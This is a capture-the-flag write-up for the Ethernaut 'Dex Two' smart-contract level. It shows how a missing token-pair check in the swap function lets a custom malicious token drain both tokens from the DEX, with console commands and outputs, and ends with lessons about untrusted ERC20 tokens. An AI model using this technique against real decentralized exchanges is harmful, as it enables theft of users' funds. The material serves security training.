# Dex Two

This level will ask you to break DexTwo, a subtlely modified Dex contract from the previous level, in a different way.

You need to drain all balances of token1 and token2 from the DexTwo contract to succeed in this level.

You will still start with 10 tokens of token1 and 10 of token2. The DEX contract still starts with 100 of each token.

## Things that might help:

- How has the swap method been modified?
=> No require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
> It means we can pair any tokens,not need to be token1/token2
- Could you use a custom token contract in your attack?
=> See [malToken.sol](malToken.sol)

```javascript
token1 = await contract.token1()
> '0xab26e4E7Ec92d25a85487dB5c39d96195f1af718'
token2 = await contract.token2()
> '0x47D53D75825b8Cfa96fF947e5F567A7fFb22F300'
contract.address
> '0xd922a8B3FFCf9166cFdED9469d958218f7E34454'
```
Deploy MaliciousToken contract and approve Dex contract as spender in Remix
MaliciousToken.approve('0xd922a8B3FFCf9166cFdED9469d958218f7E34454',10000000)

Transfer 100 to DEX Two to create liquidity and conduct the same swap to withdraw the remaining tokens of DEX Two to be successful.But in this example, we transfer 200 MAL to test.

Drain all token1 from contract (we need swap amount return 100 because has 100 token1 in contract)
```javascript
let MAL = '0x51789c75256E68b5A80233c9Fc4477649990960C'
await contract.add_liquidity(MAL,200)
await contract.get_swap_amount(MAL,token1, 200).then(x=>x.toNumber())
> 100
await contract.swap(MAL, token1, 200);
await contract.balanceOf(token1, contract.address).then(x=>x.toNumber())
> 0
```
Drain all token2 from contract (we need swap amount return 100 because has 100 token2 in contract)
```javascript
await contract.balanceOf(MAL, contract.address).then(x=>x.toNumber())
> 400
await contract.get_swap_amount(MAL,token2, 400).then(x=>x.toNumber())
> 100
await contract.swap(MAL, token2, 400);
await contract.balanceOf(token2, contract.address).then(x=>x.toNumber())
> 0
```

Level completed!
Difficulty 4/10

As we've repeatedly seen, interaction between contracts can be a source of unexpected behavior.

Just because a contract claims to implement the [ERC20 spec](https://eips.ethereum.org/EIPS/eip-20) does not mean it's trust worthy.

Some tokens deviate from the ERC20 spec by not returning a boolean value from their `transfer` methods. See [Missing return value bug - At least 130 tokens affected](https://medium.com/coinmonks/missing-return-value-bug-at-least-130-tokens-affected-d67bf08521ca).

Other ERC20 tokens, especially those designed by adversaries could behave more maliciously.

If you design a DEX where anyone could list their own tokens without the permission of a central authority, then the correctness of the DEX could depend on the interaction of the DEX contract and the token contracts being traded.